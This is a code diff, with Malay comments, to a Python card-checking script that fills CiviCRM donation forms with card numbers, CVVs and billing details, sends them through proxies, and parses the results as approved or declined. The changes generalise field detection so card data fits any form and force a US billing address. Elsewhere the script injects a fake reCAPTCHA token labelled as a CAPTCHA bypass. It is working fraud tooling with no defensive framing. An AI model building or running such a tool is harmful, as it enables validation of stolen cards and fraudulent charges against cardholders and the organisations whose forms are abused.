@@ -219,7 +219,6 @@ def get_form_action_and_payload(session, url, proxy_url):
 def parse_response(html, url):
     soup = BeautifulSoup(html, 'html.parser')
     
-    # Cari div status atau alert
     status_divs = soup.find_all('div', class_=re.compile(r'status|alert|error|messages', re.I))
     for status_div in status_divs:
         error_text = status_div.get_text(separator=' ', strip=True)
@@ -230,7 +229,6 @@ def parse_response(html, url):
             if error_text:
                 return {'approved': False, 'has_msg': True, 'message': error_text, 'clean_response': error_text}
                 
-    # Cari span class msg-text
     msg_text_span = soup.find('span', class_='msg-text')
     if msg_text_span:
         error_text = msg_text_span.get_text(strip=True)
@@ -240,7 +238,6 @@ def parse_response(html, url):
         if error_text and len(error_text) > 3:
             return {'approved': False, 'has_msg': True, 'message': error_text, 'clean_response': error_text}
             
-    # Cari ayat declined secara umum
     if 'decline' in soup.get_text(' ', strip=True).lower():
         return {'approved': False, 'has_msg': True, 'message': 'Transaction Declined', 'clean_response': 'Transaction Declined'}
 
@@ -312,15 +309,6 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_
     
     final_payload["qfKey"] = qfkey
     final_payload["entryURL"] = base_url.replace("&amp;", "&")
-    final_payload["hidden_processor"] = "1"
-    final_payload["payment_processor_id"] = "4"
-    final_payload["priceSetId"] = "3"
-    final_payload["selectProduct"] = ""
-    final_payload["MAX_FILE_SIZE"] = "536870912"
-    final_payload["price_2"] = "10"
-    final_payload["custom_1"] = "2026"
-    final_payload["custom_2"] = ""
-    final_payload["custom_3"] = ""
     
     # INJECT FAKE CAPTCHA TOKEN
     final_payload["g-recaptcha-response"] = "03AGdBq25 FakeTokenCivicrmBypass1234567890"
@@ -335,21 +323,90 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_
         submit_name = raw_payload.get('_submit_button_name', '_qf_Main_upload')
         final_payload[submit_name] = raw_payload.get('_submit_button_value', '1')
 
-    # AUTOFILL UNTUK CC DAN USER DATA
-    final_payload["email-5"] = user_data['email']
-    final_payload["credit_card_type"] = scheme
-    final_payload["credit_card_number"] = ccnum
-    final_payload["cvv2"] = cvv
-    final_payload["credit_card_exp_date[M]"] = str(input_month)
-    final_payload["credit_card_exp_date[Y]"] = full_year
-    final_payload["billing_first_name"] = user_data['first_name']
-    final_payload["billing_middle_name"] = user_data['middle_name']
-    final_payload["billing_last_name"] = user_data['last_name']
-    final_payload["billing_street_address-5"] = user_data['street_address']
-    final_payload["billing_city-5"] = user_data['city']
-    final_payload["billing_country_id-5"] = "1228"
-    final_payload["billing_state_province_id-5"] = "1022"
-    final_payload["billing_postal_code-5"] = user_data['postal_code']
+    if '_detected_payment_processor_id' in raw_payload:
+        proc_id = raw_payload['_detected_payment_processor_id'].get('value', '4')
+        final_payload['payment_processor_id'] = proc_id
+
+    price_selected = False
+
+    for key, field_info in raw_payload.items():
+        if key in ['_detected_payment_processor_id', '_form_action', '_submit_button_name', '_submit_button_value']: continue
+        if not isinstance(field_info, dict): continue
+
+        field_type = field_info.get('type', 'text')
+        options = field_info.get('options', [])
+        current_value = field_info.get('value', '')
+        key_lower = key.lower()
+
+        if 'stripe' in key_lower or 'token' in key_lower or 'paypal' in key_lower: continue
+        if field_type in ['submit', 'button', 'image']: continue
+        # Buang condition nak skip kalau current_value kosong, biarkan dia hantar string kosong
+        # if current_value in ['null', None]: continue
+
+        # OVERRIDE FIELD PENTING SAHAJA
+        if 'hidden_processor' in key_lower:
+            final_payload[key] = "1"
+            continue
+        if key == 'price_2':
+            final_payload[key] = "10"
+            price_selected = True
+            continue
+        if key == 'custom_1':
+            final_payload[key] = "2026"
+            continue
+
+        if field_type == 'radio' or field_type == 'checkbox':
+            if 'price' in key_lower or 'amount' in key_lower:
+                if not price_selected:
+                    final_payload[key] = "10"
+                    price_selected = True
+                else:
+                    final_payload[key] = '0'
+            else:
+                if 'recurring' in key_lower or 'recur' in key_lower: 
+                    final_payload[key] = '0'
+                else: 
+                    final_payload[key] = current_value
+            continue
+
+        if field_type == 'select':
+            if 'state' in key_lower or 'province' in key_lower: 
+                final_payload[key] = "1022" # Force Minnesota
+            elif 'country' in key_lower: 
+                final_payload[key] = '1228' # Force US
+            elif 'card' in key_lower and 'type' in key_lower: 
+                final_payload[key] = scheme
+            elif 'exp' in key_lower and ('y' in key_lower or 'year' in key_lower): 
+                final_payload[key] = full_year
+            elif 'exp' in key_lower and ('m' in key_lower or 'month' in key_lower): 
+                final_payload[key] = str(input_month)
+            else:
+                final_payload[key] = current_value if current_value else (options[0] if options else "")
+            continue
+
+        if field_type == 'hidden':
+            if isinstance(current_value, str):
+                final_payload[key] = current_value.replace("&amp;", "&")
+            continue
+
+        if 'card' in key_lower and ('number' in key_lower or 'no' in key_lower or 'num' in key_lower): final_payload[key] = ccnum
+        elif 'cvv' in key_lower or 'cvc' in key_lower or 'cid' in key_lower or ('security' in key_lower and 'code' in key_lower): final_payload[key] = cvv
+        elif 'exp' in key_lower and ('y' in key_lower or 'year' in key_lower): final_payload[key] = full_year
+        elif 'exp' in key_lower and ('m' in key_lower or 'month' in key_lower): final_payload[key] = str(input_month)
+        elif 'card' in key_lower and 'type' in key_lower: final_payload[key] = scheme
+        
+        elif 'first' in key_lower and 'name' in key_lower: final_payload[key] = user_data['first_name']
+        elif 'last' in key_lower and 'name' in key_lower: final_payload[key] = user_data['last_name']
+        elif 'middle' in key_lower and 'name' in key_lower: final_payload[key] = user_data['middle_name']
+        elif 'email' in key_lower: final_payload[key] = user_data['email']
+        elif 'street' in key_lower or 'address' in key_lower or 'addr1' in key_lower or 'line_1' in key_lower: final_payload[key] = user_data['street_address']
+        elif 'city' in key_lower: final_payload[key] = user_data['city']
+        elif 'zip' in key_lower or 'postal' in key_lower: final_payload[key] = user_data['postal_code']
+        elif 'phone' in key_lower or 'tel' in key_lower or 'mobile' in key_lower: final_payload[key] = user_data['phone']
+        else:
+            if not current_value:
+                continue
+            final_payload[key] = current_value
 
     return final_payload
 
@@ -390,7 +447,6 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
             confirm_btn = soup_resp.find('input', {'name': '_qf_Confirm_next'}) or soup_resp.find('button', {'name': '_qf_Confirm_next'})
             is_confirmation = '_qf_Confirm_display=true' in response.url or '_qf_Confirm_display=1' in response.url
             
-            # Print URL je supaya senang nak check di Logs
             logging.info(f"URL Selepas Submit Pertama: {response.url}")
             
             if confirm_btn or is_confirmation:
